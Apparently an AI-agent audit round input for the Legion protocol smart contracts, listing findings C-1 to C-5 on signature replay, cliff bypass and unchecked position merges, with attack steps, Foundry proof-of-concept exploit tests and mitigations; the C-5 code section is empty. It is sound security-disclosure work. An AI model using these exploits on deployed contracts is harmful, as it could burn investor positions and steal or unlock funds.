# legion-protocol-contracts Round Input

Source report: `/Users/apmfree/Desktop/CHAIN SHIELD/ai-agent-audit/legion-protocol-contracts/report/audit-report.md`
Finding count: `12`

## Findings

### C-1 / `uoil2rJMmqsP86suE8nmu`
- Finding title: Replayable position-transfer signature can burn a later position and erase the recipient position accounting
- Report lines: 101-262
```md
## [C-1]. Replayable position-transfer signature can burn a later position and erase the recipient position accounting

## id: uoil2rJMmqsP86suE8nmu

## Derived From Pattern/Invariant
DoubleExecutionOrReplay: transfer authorizations are not consumed and can be replayed after ownership changes

## Exploit Type
ReplayAttack

## Location
LegionCapitalRaise.transferInvestorPositionWithAuthorization

## Finding Status: Valid
### Finding Status Justification: The described code path exists. transferInvestorPositionWithAuthorization verifies a signature over from, to, positionId, msg.sender, contract, and chain, but does not store the transfer signature or digest as used. _burnOrTransferInvestorPosition only checks whether the recipient already has a position and whether that recipient position is mergeable; it does not require s_investorPositionIds[from] == positionId or ownerOf(positionId) == from before the merge branch. After an authorized transfer from Alice to Bob, Bob maps to the old positionId. If Alice later receives another position, replaying the old signature enters the merge path, loads positionToBurn from the old positionId, adds it into itself, deletes s_investorPositions[positionId], then _burnInvestorPosition(Alice) burns Alice's current mapped token. Existing transferability checks only inspect the stale position's state and do not prevent replay or ownership mismatch. This is not documented as intentional, does not require privileged access after the first valid authorization, and does not depend on non-standard tokens or future code. It can permanently destroy a user's position NFT and corrupt/delete accounting, which is high impact; likelihood is occasional because it requires a prior valid transfer authorization, a later position acquisition by the original from address, and replay by the authorized executor.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`transferInvestorPositionWithAuthorization()` verifies a Legion transfer signature but never consumes it. The merge branch in `_burnOrTransferInvestorPosition()` also does not verify that `_from` currently owns `_positionId`; when `_to` already maps to `_positionId`, it self-merges, deletes that position's accounting, and then burns whatever position is currently mapped to `_from`.

Vulnerable snippet:
`function transferInvestorPositionWithAuthorization(address from, address to, uint256 positionId, bytes calldata signature) external ... { _verifyTransferSignature(from, to, positionId, s_capitalRaiseConfig.legionSigner, signature); _verifyCanTransferInvestorPosition(positionId); _burnOrTransferInvestorPosition(from, to, positionId); }`

`if (positionIdTo != 0) { InvestorPosition memory positionToBurn = s_investorPositions[_positionId]; InvestorPosition storage positionToUpdate = s_investorPositions[positionIdTo]; positionToUpdate.investedCapital += positionToBurn.investedCapital; ... delete s_investorPositions[_positionId]; _burnInvestorPosition(_from); }`

A stale executor can replay an already-used authorization after the original `from` address receives another position. The replay enters the merge branch because `to` already holds the old `positionId`, deletes the old recipient's accounting, and burns the unrelated new position currently owned by `from`. This permanently destroys an SBT position NFT and corrupts the recipient's position accounting.

## Impact
Permanent loss of a user position NFT and deletion of another holder's position accounting after a single legitimate transfer authorization is replayed by the same unprivileged executor.

## Proof of Concept
1. Alice has position #1 and Charlie has position #2; both have claimed excess so positions are transferable.
2. Legion signs a transfer authorization for executor E to move Alice's #1 to Bob.
3. E executes it once; Bob now owns #1 and Alice has no position.
4. Charlie transfers #2 to Alice.
5. E replays the old Alice-to-Bob signature.
6. Because Bob already maps to #1, the merge path deletes accounting for #1 and `_burnInvestorPosition(alice)` burns Alice's current #2. The stale signature was never consumed.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Test} from "forge-std/Test.sol";
import {LibClone} from "@solady/src/utils/LibClone.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {LegionCapitalRaise} from "src/raise/LegionCapitalRaise.sol";
import {LegionAddressRegistry} from "src/registries/LegionAddressRegistry.sol";
import {ILegionCapitalRaise} from "src/interfaces/raise/ILegionCapitalRaise.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) { balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract LegionCapitalRaiseTransferReplayTest is Test {
    using MessageHashUtils for bytes32;

    uint256 internal signerPk = 0xA11CE;
    address internal signer;
    address internal project = address(0x1000);
    address internal executor = address(0x2000);
    address internal alice = address(0xA1);
    address internal bob = address(0xB0B);
    address internal charlie = address(0xC0);
    uint256 internal constant RATE = 1e18;

    MockERC20 internal token;
    LegionCapitalRaise internal raise;

    function setUp() public {
        signer = vm.addr(signerPk);
        token = new MockERC20();
        LegionAddressRegistry registry = new LegionAddressRegistry(address(this));
        registry.setLegionAddress(bytes32("LEGION_BOUNCER"), address(0xB011CE));
        registry.setLegionAddress(bytes32("LEGION_SIGNER"), signer);
        registry.setLegionAddress(bytes32("LEGION_FEE_RECEIVER"), address(0xFEE));

        address impl = address(new LegionCapitalRaise());
        raise = LegionCapitalRaise(LibClone.clone(impl));
        raise.initialize(ILegionCapitalRaise.CapitalRaiseInitializationParams({
            refundPeriodSeconds: 1 hours,
            legionFeeOnCapitalRaisedBps: 0,
            referrerFeeOnCapitalRaisedBps: 0,
            bidToken: address(token),
            projectAdmin: project,
            addressRegistry: address(registry),
            referrerFeeReceiver: address(0),
            saleName: "Legion Raise",
            saleSymbol: "LR",
            saleBaseURI: "ipfs://base/"
        }));
    }

    function testReplayTransferAuthorizationBurnsLaterPositionAndDeletesAccounting() public {
        _investAndClaimExcess(alice, 100 ether);
        _investAndClaimExcess(charlie, 200 ether);

        vm.prank(project);
        raise.end();
        vm.warp(block.timestamp + 1 hours + 1);

        bytes memory staleSig = _signTransfer(alice, bob, 1, executor);
        vm.prank(executor);
        raise.transferInvestorPositionWithAuthorization(alice, bob, 1, staleSig);
        assertEq(raise.ownerOf(1), bob);

        bytes memory sig2 = _signTransfer(charlie, alice, 2, executor);
        vm.prank(executor);
        raise.transferInvestorPositionWithAuthorization(charlie, alice, 2, sig2);
        assertEq(raise.ownerOf(2), alice);
        assertEq(raise.balanceOf(alice), 1);

        vm.prank(executor);
        raise.transferInvestorPositionWithAuthorization(alice, bob, 1, staleSig);

        assertEq(raise.balanceOf(alice), 0);
        assertEq(raise.ownerOf(1), bob);
        ILegionCapitalRaise.InvestorPosition memory bobPosition = raise.investorPosition(bob);
        assertEq(bobPosition.investedCapital, 0);
        vm.expectRevert();
        raise.ownerOf(2);
    }

    function _investAndClaimExcess(address investor, uint256 amount) internal {
        token.mint(investor, amount);
        vm.startPrank(investor);
        token.approve(address(raise), amount);
        raise.invest(amount, amount, RATE, _signPosition(investor, amount, RATE, ILegionCapitalRaise.CapitalRaiseAction.INVEST));
        raise.withdrawExcessInvestedCapital(0, amount, RATE, _signPosition(investor, amount, RATE, ILegionCapitalRaise.CapitalRaiseAction.WITHDRAW_EXCESS_CAPITAL));
        vm.stopPrank();
    }

    function _signPosition(address investor, uint256 investAmount, uint256 rate, ILegionCapitalRaise.CapitalRaiseAction action) internal view returns (bytes memory) {
        bytes32 h = keccak256(abi.encodePacked(investor, address(raise), block.chainid, investAmount, rate, action)).toEthSignedMessageHash();
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, h);
        return abi.encodePacked(r, s, v);
    }

    function _signTransfer(address from, address to, uint256 positionId, address caller) internal view returns (bytes memory) {
        bytes32 h = keccak256(abi.encodePacked(from, to, positionId, caller, address(raise), block.chainid)).toEthSignedMessageHash();
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, h);
        return abi.encodePacked(r, s, v);
    }
}


## Suggested Mitigation
Consume transfer authorizations by storing a used transfer digest or nonce, and validate ownership before merge: require `s_investorPositionIds[from] == positionId` and `ownerOf(positionId) == from`. Also reject self-merges where `s_investorPositionIds[to] == positionId`.
```

### C-2 / `iD7WrY6Dj3h9mjw-VVWl5`
- Finding title: Inherited native ETH release() bypasses LegionLinearVesting cliff and allows premature withdrawal
- Report lines: 263-343
```md
## [C-2]. Inherited native ETH release() bypasses LegionLinearVesting cliff and allows premature withdrawal

## id: iD7WrY6Dj3h9mjw-VVWl5

## Derived From Pattern/Invariant
MaturityorGatingByPass: every releasable asset path must be cliff-gated

## Exploit Type
AccountingInvariantViolation

## Location
LegionLinearVesting.release()

## Finding Status: Valid
### Finding Status Justification: The reported code path exists. LegionLinearVesting inherits OpenZeppelin VestingWalletUpgradeable and only overrides release(address token) with onlyCliffEnded. It does not override the no-argument native ETH release() path, while the base vesting wallet exposes native ETH vesting/release behavior and can receive ETH. Therefore, after vesting start but before s_cliffEndTimestamp, release(address token) reverts but inherited release() can still compute and transfer vested native ETH to the owner/beneficiary under the base linear schedule. The protocol’s own NatSpec says the contract extends VestingWalletUpgradeable with cliff functionality and only documents cliff protection generally, so the missing guard is not documented as intentional. It is in scope because LegionLinearVesting is explicitly in scope. There is no shown safeguard equivalent to onlyCliffEnded on the native ETH path, and no receive override preventing ETH custody. The issue is exploitable for native ETH held by the clone, but the protocol mechanics mainly describe ERC20 token sales and ERC20 vesting/distribution, so this is not a Critical/High direct theft scenario in the normal asset flow. The caller cannot redirect funds to themselves unless they are the beneficiary; the impact is premature release of native ETH to the intended beneficiary, not theft from other users. Likelihood is occasional because the vesting clone must hold native ETH and the schedule must be between start and cliff. It does not depend on privileged misuse, future code changes, or non-standard ERC20 behavior.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
LegionLinearVesting only overrides the ERC20 release entry point, leaving the native ETH release path inherited from OpenZeppelin VestingWalletUpgradeable unguarded. The cliff check is applied here:

function release(address token) public override onlyCliffEnded {
    super.release(token);
}

However, VestingWalletUpgradeable also exposes release() for native ETH and has a payable receive path. Because LegionLinearVesting does not override release(), any caller can invoke the inherited native release before s_cliffEndTimestamp. The inherited function computes the linearly vested ETH amount using the base schedule and transfers it to owner()/beneficiary(), while the ERC20 release(address) path would correctly revert. This violates the invariant that no releasable asset can be released before the cliff ends.

## Impact
Native ETH funded into a vesting clone can be released to the beneficiary before the configured cliff. A beneficiary-controlled attacker can extract time-locked principal early, bypassing the protocol's cliff protection for that asset path.

## Proof of Concept
1. A LegionLinearVesting clone is initialized with startTimestamp in the past, durationSeconds > cliffDurationSeconds, and cliffDurationSeconds > 0.
2. The clone receives native ETH through the inherited receive() function.
3. While block.timestamp is after startTimestamp but before cliffEndTimestamp(), ERC20 release(address) would revert due to onlyCliffEnded.
4. The attacker calls the inherited no-argument release() function.
5. The base VestingWalletUpgradeable logic releases the linearly vested ETH to owner()/beneficiary() before the Legion cliff ends.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.30;

import {Test} from "forge-std/Test.sol";
import {Clones} from "@openzeppelin/contracts/proxy/Clones.sol";
import {LegionLinearVesting} from "src/vesting/LegionLinearVesting.sol";

interface INativeVestingRelease {
    function release() external;
}

contract LegionLinearVestingEthCliffBypassTest is Test {
    function test_nativeEthReleaseBypassesCliff() public {
        address beneficiary = address(0xBEEF);
        address controller = address(0xCAFE);

        LegionLinearVesting implementation = new LegionLinearVesting();
        LegionLinearVesting vesting = LegionLinearVesting(payable(Clones.clone(address(implementation))));

        uint64 start = uint64(block.timestamp);
        uint64 duration = 100 days;
        uint64 cliff = 50 days;
        vesting.initialize(beneficiary, controller, start, duration, cliff);

        vm.deal(address(this), 10 ether);
        payable(address(vesting)).transfer(10 ether);

        vm.warp(start + 10 days);
        assertLt(block.timestamp, vesting.cliffEndTimestamp());
        assertEq(beneficiary.balance, 0);

        INativeVestingRelease(address(vesting)).release();

        assertGt(beneficiary.balance, 0);
        assertEq(address(vesting).balance, 9 ether);
    }
}

## Suggested Mitigation
Override the inherited native ETH release() function and apply the same onlyCliffEnded modifier before delegating to super.release(). If native ETH is not intended to be supported, override receive() to revert and/or override release() to revert explicitly.
```

### H-3 / `cqFeWIWPbvD3ZADRTIFts`
- Finding title: Reusable investment signatures allow uncapped repeated bids in LegionSealedBidAuctionSale.invest
- Report lines: 344-447
```md
## [H-3]. Reusable investment signatures allow uncapped repeated bids in LegionSealedBidAuctionSale.invest

## id: cqFeWIWPbvD3ZADRTIFts

## Derived From Pattern/Invariant
PermitOrSignatureReplay

## Exploit Type
SignatureReplay

## Location
LegionSealedBidAuctionSale.invest

## Finding Status: Valid
### Finding Status Justification: The code path exists. LegionSealedBidAuctionSale.invest calls _verifyInvestSignature(signature), which verifies only keccak256(abi.encodePacked(msg.sender, address(this), block.chainid)) against s_addressConfig.legionSigner. The signed data does not include amount, sealedBid/encrypted bid contents, deadline, nonce, action type, or a one-time-use digest. There is also no used-signature mapping in LegionAbstractSale, unlike LegionCapitalRaise and LegionPreLiquidApprovedSale, which explicitly track used signatures. Therefore the same eligible investor can call invest repeatedly during the sale with the same signature and arbitrary amounts/sealed bids, provided they have funds and meet minimum amount. Pausing and sale-window checks do not mitigate replay. This is in scope because signature binding/replay resistance is a stated priority and does not require privileged misuse or non-standard tokens. The direct impact is unauthorized over-investment or allocation capture relative to off-chain eligibility terms; final auction publication is trusted/off-chain, so the backend could theoretically choose not to honor excess bids, which limits objective severity from High asset loss to Medium integrity/accounting/allocation risk. Likelihood is common once a valid eligibility signature is obtained because replay has no additional technical preconditions before sale end.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
The investment authorization only signs `msg.sender`, the sale address, and `block.chainid`; it does not bind the authorized amount, sealed bid hash, deadline, nonce, or one-time use. The signature is also never stored as consumed. Vulnerable snippet: `bytes32 _data = keccak256(abi.encodePacked(msg.sender, address(this), block.chainid)).toEthSignedMessageHash(); if (_data.recover(_signature) != s_addressConfig.legionSigner) revert ...;`. Any address that obtains one valid eligibility signature can reuse it for unlimited investments with arbitrary amounts and arbitrary sealed-bid ciphertexts until the sale ends, bypassing per-authorization caps that the signed approval is expected to enforce.

## Impact
Unauthorized over-investment and auction allocation capture beyond the signed terms. In an oversubscribed sale, an eligible attacker can repeatedly grow their position and crowd out other investors' allocations, causing legitimate investors to receive reduced or frozen excess-refund/claim outcomes relative to the intended authorization set.

## Proof of Concept
1. Legion signer issues one eligibility signature for an investor for this sale. 2. The investor calls `invest(1 ether, sealedBidA, signature)`, which succeeds. 3. The same investor calls `invest(100 ether, sealedBidB, signature)` with the exact same signature and a different encrypted bid. 4. Both calls succeed and the investor position plus `totalCapitalInvested` increase by 101 ether even though only one authorization was issued and no amount or sealed bid was signed.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "forge-std/Test.sol";
import {LegionSealedBidAuctionSale} from "src/sales/LegionSealedBidAuctionSale.sol";
import {ILegionAbstractSale} from "src/interfaces/sales/ILegionAbstractSale.sol";
import {ILegionSealedBidAuctionSale} from "src/interfaces/sales/ILegionSealedBidAuctionSale.sol";
import {ILegionAddressRegistry} from "src/interfaces/registries/ILegionAddressRegistry.sol";
import {Constants} from "src/utils/Constants.sol";
import {ECIES, Point} from "src/lib/ECIES.sol";

contract PlainToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) { balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) { allowance[from][msg.sender] -= amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
}

contract ReplayRegistry is ILegionAddressRegistry {
    mapping(bytes32 => address) public addrs;
    function setLegionAddress(bytes32 id, address updatedAddress) external { addrs[id] = updatedAddress; }
    function getLegionAddress(bytes32 id) external view returns (address) { return addrs[id]; }
}

contract SignatureReplayInvestTest is Test {
    LegionSealedBidAuctionSale sale;
    PlainToken bid;
    ReplayRegistry registry;
    uint256 signerPk = 11;
    address signer;
    address investor = address(0xA11CE);
    Point pubKey;

    function setUp() public {
        signer = vm.addr(signerPk);
        bid = new PlainToken();
        registry = new ReplayRegistry();
        registry.setLegionAddress(Constants.LEGION_BOUNCER_ID, address(0xB0A));
        registry.setLegionAddress(Constants.LEGION_SIGNER_ID, signer);
        registry.setLegionAddress(Constants.LEGION_FEE_RECEIVER_ID, address(0xFEE));
        registry.setLegionAddress(Constants.LEGION_VESTING_FACTORY_ID, address(0x1234));
        registry.setLegionAddress(Constants.LEGION_VESTING_CONTROLLER_ID, address(0x5678));
        pubKey = ECIES.calcPubKey(Point(1, 2), 2);
        sale = new LegionSealedBidAuctionSale();
        ILegionAbstractSale.LegionSaleInitializationParams memory p = ILegionAbstractSale.LegionSaleInitializationParams({salePeriodSeconds: 1 days, refundPeriodSeconds: 1 days, legionFeeOnCapitalRaisedBps: 0, legionFeeOnTokensSoldBps: 0, referrerFeeOnCapitalRaisedBps: 0, referrerFeeOnTokensSoldBps: 0, minimumInvestAmount: 1, bidToken: address(bid), askToken: address(0xCAFE), projectAdmin: address(0xB0B), addressRegistry: address(registry), referrerFeeReceiver: address(0), saleName: "Sale", saleSymbol: "SALE", saleBaseURI: "ipfs://sale/"});
        ILegionSealedBidAuctionSale.SealedBidAuctionSaleInitializationParams memory a = ILegionSealedBidAuctionSale.SealedBidAuctionSaleInitializationParams({publicKey: pubKey});
        sale.initialize(p, a);
        bid.mint(investor, 101 ether);
        vm.prank(investor); bid.approve(address(sale), type(uint256).max);
    }

    function sig() internal view returns (bytes memory) {
        bytes32 h = keccak256(abi.encodePacked(investor, address(sale), block.chainid));
        bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", h));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, ethHash);
        return abi.encodePacked(r, s, v);
    }

    function testSameEligibilitySignatureCanBeReplayedForDifferentAmountsAndBids() public {
        bytes memory authorization = sig();
        vm.startPrank(investor);
        sale.invest(1 ether, abi.encode(uint256(111), pubKey), authorization);
        sale.invest(100 ether, abi.encode(uint256(222), pubKey), authorization);
        vm.stopPrank();
        assertEq(sale.saleStatus().totalCapitalInvested, 101 ether);
        assertEq(sale.investorPosition(investor).investedCapital, 101 ether);
    }
}

## Suggested Mitigation
Use a typed authorization that binds investor, sale, chain id, amount or max cap, sealed bid hash, deadline, action/round, and a per-investor nonce. Store and consume nonces or signature digests before accepting the investment, and reject reused or expired authorizations.
```

### C-4 / `kM-dNdUpDkp_c64tx7EYq`
- Finding title: Replayable transfer authorization corrupts investor position ownership in LegionFixedPriceSale
- Report lines: 448-622
```md
## [C-4]. Replayable transfer authorization corrupts investor position ownership in LegionFixedPriceSale

## id: kM-dNdUpDkp_c64tx7EYq

## Derived From Pattern/Invariant
DoubleExecutionOrReplay

## Exploit Type
SignatureReplay

## Location
LegionFixedPriceSale.transferInvestorPositionWithAuthorization

## Finding Status: Valid
### Finding Status Justification: The described path exists in LegionFixedPriceSale through inherited LegionAbstractSale.transferInvestorPositionWithAuthorization. The signature binds from, to, positionId, msg.sender, sale address, and chain id, but there is no nonce, consumed-signature mapping, deadline, or current owner check before the merge path. _verifyCanTransferInvestorPosition only checks position flags, not ownerOf(positionId). If the recipient already has a position, _burnOrTransferInvestorPosition reads s_investorPositions[positionId], adds its investedCapital into recipient's existing position, deletes that position storage, then calls _burnInvestorPosition(from), which burns s_investorPositionIds[from], not necessarily positionId. Thus a stale authorization can corrupt accounting if from later owns another position and positionId is owned by someone else. It is in scope, not documented as intended, and does not depend on non-standard token behavior. Exploitability requires a previously valid Legion transfer authorization, the same authorized caller, both positions being transferable/mergeable, and the post-refund/pre-results window, so likelihood is Occasional, but impact is High because accounting and token allocation entitlements can be stolen or destroyed.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`transferInvestorPositionWithAuthorization` accepts the same Legion-signed transfer authorization repeatedly and `_burnOrTransferInvestorPosition` does not verify that `from` still owns `positionId` before merging into an address that already has a position. The signature only binds `(from, to, positionId, msg.sender, address(this), block.chainid)` and is never consumed. In the merge branch, the contract loads and deletes `s_investorPositions[_positionId]` but burns `s_investorPositionIds[_from]`, which may now be a different NFT. Vulnerable snippet: `positionToUpdate.investedCapital += positionToBurn.investedCapital; delete s_investorPositions[_positionId]; _burnInvestorPosition(_from);`. A stale authorization can therefore move accounting from a position owned by a third party into the attacker's current position while burning an unrelated NFT from `from`.

## Impact
Direct corruption/theft of investor position accounting and permanent burning/freezing of unrelated investor position NFTs. The attacker can make one investor's stored capital disappear, add it to the attacker's position, and burn another investor's current position NFT.

## Proof of Concept
1. Alice owns position P and Legion signs an authorization allowing caller Bob to transfer P from Alice to Bob. 2. Bob executes it once, so Bob owns P. 3. P is later transferred to Carol, Bob receives a different position R, and Alice receives a different position Q. 4. Bob replays the old Alice->Bob signature for P. 5. Because Bob already owns R, the merge branch adds Carol's P accounting into Bob's R, deletes P's storage, and burns Alice's Q via `_burnInvestorPosition(Alice)`.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "forge-std/Test.sol";
import {LibClone} from "@solady/src/utils/LibClone.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {LegionFixedPriceSale} from "../src/sales/LegionFixedPriceSale.sol";
import {ILegionAbstractSale} from "../src/interfaces/sales/ILegionAbstractSale.sol";
import {ILegionFixedPriceSale} from "../src/interfaces/sales/ILegionFixedPriceSale.sol";
import {ILegionAddressRegistry} from "../src/interfaces/registries/ILegionAddressRegistry.sol";
import {Constants} from "../src/utils/Constants.sol";

contract MockRegistry is ILegionAddressRegistry {
    mapping(bytes32 => address) public a;
    function setLegionAddress(bytes32 id, address updatedAddress) external { a[id] = updatedAddress; }
    function getLegionAddress(bytes32 id) external view returns (address) { return a[id]; }
}

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) { balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) { allowance[from][msg.sender] -= amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
}

contract ReplayTransferPoC is Test {
    using LibClone for address;
    using MessageHashUtils for bytes32;

    uint256 signerPk = 0xA11CE;
    address signer = vm.addr(signerPk);
    address legion = address(0xB0A);
    address project = address(0xB0B);
    address alice = address(0xA1);
    address bob = address(0xB2);
    address carol = address(0xC3);
    address dave = address(0xD4);
    address erin = address(0xE5);

    LegionFixedPriceSale sale;
    MockERC20 bid;
    MockERC20 ask;
    MockRegistry reg;

    function setUp() public {
        bid = new MockERC20();
        ask = new MockERC20();
        reg = new MockRegistry();
        reg.setLegionAddress(Constants.LEGION_BOUNCER_ID, legion);
        reg.setLegionAddress(Constants.LEGION_SIGNER_ID, signer);
        reg.setLegionAddress(Constants.LEGION_FEE_RECEIVER_ID, address(0xFEE));
        reg.setLegionAddress(Constants.LEGION_VESTING_FACTORY_ID, address(0xFACADE));
        reg.setLegionAddress(Constants.LEGION_VESTING_CONTROLLER_ID, address(0xCAFE));

        LegionFixedPriceSale impl = new LegionFixedPriceSale();
        sale = LegionFixedPriceSale(address(impl).clone());
        sale.initialize(
            ILegionAbstractSale.LegionSaleInitializationParams({
                salePeriodSeconds: 1 hours,
                refundPeriodSeconds: 1 hours,
                legionFeeOnCapitalRaisedBps: 0,
                legionFeeOnTokensSoldBps: 0,
                referrerFeeOnCapitalRaisedBps: 0,
                referrerFeeOnTokensSoldBps: 0,
                minimumInvestAmount: 1,
                bidToken: address(bid),
                askToken: address(ask),
                projectAdmin: project,
                addressRegistry: address(reg),
                referrerFeeReceiver: address(0x1234),
                saleName: "SALE",
                saleSymbol: "SALE",
                saleBaseURI: "uri/"
            }),
            ILegionFixedPriceSale.FixedPriceSaleInitializationParams({
                prefundPeriodSeconds: 1 hours,
                prefundAllocationPeriodSeconds: 1 hours,
                tokenPrice: 1e18
            })
        );
        _invest(alice, 100 ether);
        _invest(dave, 1 ether);
        _invest(erin, 50 ether);
        _markExcessClaimed(alice, 100 ether);
        _markExcessClaimed(dave, 1 ether);
        _markExcessClaimed(erin, 50 ether);
        vm.warp(block.timestamp + 5 hours);
    }

    function testReplayStealsAccountingAndBurnsUnrelatedPosition() public {
        bytes memory oldSig = _transferSig(alice, bob, 1, bob);
        vm.prank(bob);
        sale.transferInvestorPositionWithAuthorization(alice, bob, 1, oldSig);

        vm.prank(bob);
        sale.transferInvestorPositionWithAuthorization(bob, carol, 1, _transferSig(bob, carol, 1, bob));
        vm.prank(bob);
        sale.transferInvestorPositionWithAuthorization(dave, bob, 2, _transferSig(dave, bob, 2, bob));
        vm.prank(bob);
        sale.transferInvestorPositionWithAuthorization(erin, alice, 3, _transferSig(erin, alice, 3, bob));

        vm.prank(bob);
        sale.transferInvestorPositionWithAuthorization(alice, bob, 1, oldSig);

        assertEq(sale.investorPosition(bob).investedCapital, 101 ether);
        assertEq(sale.investorPosition(carol).investedCapital, 0);
        vm.expectRevert();
        sale.ownerOf(3);
    }

    function _invest(address who, uint256 amount) internal {
        bid.mint(who, amount);
        vm.startPrank(who);
        bid.approve(address(sale), amount);
        sale.invest(amount, _investSig(who));
        vm.stopPrank();
    }

    function _markExcessClaimed(address who, uint256 invested) internal {
        bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(who, invested))));
        vm.prank(legion);
        sale.setAcceptedCapital(leaf);
        vm.prank(who);
        sale.withdrawExcessInvestedCapital(0, new bytes32[](0));
    }

    function _investSig(address who) internal returns (bytes memory) {
        bytes32 h = keccak256(abi.encodePacked(who, address(sale), block.chainid)).toEthSignedMessageHash();
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, h);
        return abi.encodePacked(r, s, v);
    }

    function _transferSig(address from, address to, uint256 id, address caller) internal returns (bytes memory) {
        bytes32 h = keccak256(abi.encodePacked(from, to, id, caller, address(sale), block.chainid)).toEthSignedMessageHash();
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, h);
        return abi.encodePacked(r, s, v);
    }
}


## Suggested Mitigation
Track and consume transfer authorizations with a nonce or signature hash, and require `ownerOf(_positionId) == _from` plus `s_investorPositionIds[_from] == _positionId` before either transfer or merge. In the merge branch, burn exactly `_positionId` or transfer through ERC721 ownership checks before deleting its accounting.
```

### C-5 / `jHvRScpU_KDrXKUzzXRV9`
- Finding title: Position merge can credit a victim's position to another account while burning an unrelated position
- Report lines: 623-657
```md
## [C-5]. Position merge can credit a victim's position to another account while burning an unrelated position

## id: jHvRScpU_KDrXKUzzXRV9

## Derived From Pattern/Invariant
AccessControlOrAuthByPass / AccountingInvariantViolation: transfer merge must prove from owns positionId before deleting or burning

## Exploit Type
AuthByPass

## Location
LegionAbstractSale._burnOrTransferInvestorPosition

## Finding Status: Valid
### Finding Status Justification: The merge bug exists exactly as described. _burnOrTransferInvestorPosition(from,to,positionId) checks only whether to already has a position and whether the recipient position is mergeable. It then reads and deletes s_investorPositions[positionId], but burns the position mapped to from via _burnInvestorPosition(from). There is no ownership invariant check tying from to positionId. The public permissionless path still requires a valid Legion transfer signature for the inconsistent tuple, and the onlyLegion path requires a trusted privileged caller. Because privileged misuse alone is governance risk, exploitability through the permissionless signature path depends on an actually obtainable stale or wrongly issued authorization. Still, once such authorization exists, the on-chain code permits corruption without further privilege. Impact is High because investor accounting can be moved or zeroed, causing loss/freezing of refund or token entitlement. Not by design; position/NFT accounting is meant to track entitlements consistently.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
The merge branch of `_burnOrTransferInvestorPosition(from, to, positionId)` never verifies that `from` owns `positionId` or that `s_investorPositionIds[from] == positionId`. When `to` already has a position, the function copies `s_investorPositions[positionId]` into `to`'s position, deletes `s_investorPositions[positionId]`, and then calls `_burnInvestorPosition(from)`. `_burnInvestorPosition(from)` burns `s_investorPositionIds[from]`, which may be a different NFT. Vulnerable snippet: `InvestorPosition memory positionToBurn = s_investorPositions[_positionId]; ... positionToUpdate.investedCapital += positionToBurn.investedCapital; delete s_investorPositions[_positionId]; _burnInvestorPosition(_from);`. The public `transferInvestorPositionWithAuthorization` path verifies a Legion signature over the tuple, but the contract itself does not enforce the ownership/accounting invariant, so any valid authorization for an inconsistent tuple corrupts custody and position accounting.

## Impact
A victim's investor position accounting can be deleted and merged into another account, leaving the victim with an NFT pointing to zeroed accounting while an unrelated `from` position is burned. This can permanently destroy the victim's refund or token-claim entitlement and transfer its recorded capital to another investor position.

## Proof of Concept
1. Victim owns position P with investedCapital 100 and it is transferable. 2. Address F owns a different position Q. 3. Receiver T already owns mergeable position R. 4. A transfer authorization or Legion transfer call is made with from = F, to = T, positionId = P. 5. The merge branch credits P's investedCapital into T's position R and deletes P's accounting, but burns Q because `_burnInvestorPosition` uses `s_investorPositionIds[F]`. 6. Victim still maps to/owns P, but P's accounting is zeroed and T received the value.

## Proof of Code
